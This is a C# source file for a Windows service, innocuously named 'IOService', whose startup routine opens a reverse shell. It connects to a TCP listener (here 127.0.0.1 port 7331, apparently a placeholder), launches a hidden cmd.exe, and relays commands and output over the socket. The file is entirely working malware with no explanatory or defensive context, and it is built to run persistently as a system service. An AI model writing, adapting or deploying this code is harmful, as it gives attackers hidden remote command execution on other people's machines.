using System; 
using System.Diagnostics; 
using System.IO; 
using System.Net.Sockets; 
using System.ServiceProcess; 
using System.Text;

namespace IOService 
{ 
    public partial class IOService : ServiceBase 
    { 
        public IOService() 
        { 
            InitializeComponent(); 
        } 
        
        protected override void OnStart(string[] args) 
        { 
            ReverseShell(); 
        } 
        
        static StreamWriter streamWriter;

        public static void ReverseShell() 
        {
            using (TcpClient client = new TcpClient("127.0.0.1", 7331)) 
            { 
                using (Stream stream = client.GetStream()) 
                { 
                    using (StreamReader rdr = new StreamReader(stream)) 
                    { 
                        streamWriter = new StreamWriter(stream); 
                        StringBuilder strInput = new StringBuilder(); 
                        Process p = new Process(); 
                        p.StartInfo.FileName = "cmd.exe"; 
                        p.StartInfo.CreateNoWindow = true; 
                        p.StartInfo.UseShellExecute = false; 
                        p.StartInfo.RedirectStandardOutput = true; 
                        p.StartInfo.RedirectStandardInput = true; 
                        p.StartInfo.RedirectStandardError = true; 
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler); 
                        p.Start(); 
                        p.BeginOutputReadLine();

                        while (true) 
                        { 
                            strInput.Append(rdr.ReadLine()); 
                            p.StandardInput.WriteLine(strInput); 
                            strInput.Remove(0, strInput.Length); 
                        } 
                    } 
                }
                
            } 
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine) 
        {
            StringBuilder strOutput = new StringBuilder(); 
            if (!String.IsNullOrEmpty(outLine.Data)) 
            { 
                try 
                { 
                    strOutput.Append(outLine.Data); 
                    streamWriter.WriteLine(strOutput); 
                    streamWriter.Flush(); 
                } 
                catch (Exception err) { } 
            } 
        }
        protected override void OnStop() 
        {

        } 
    }
}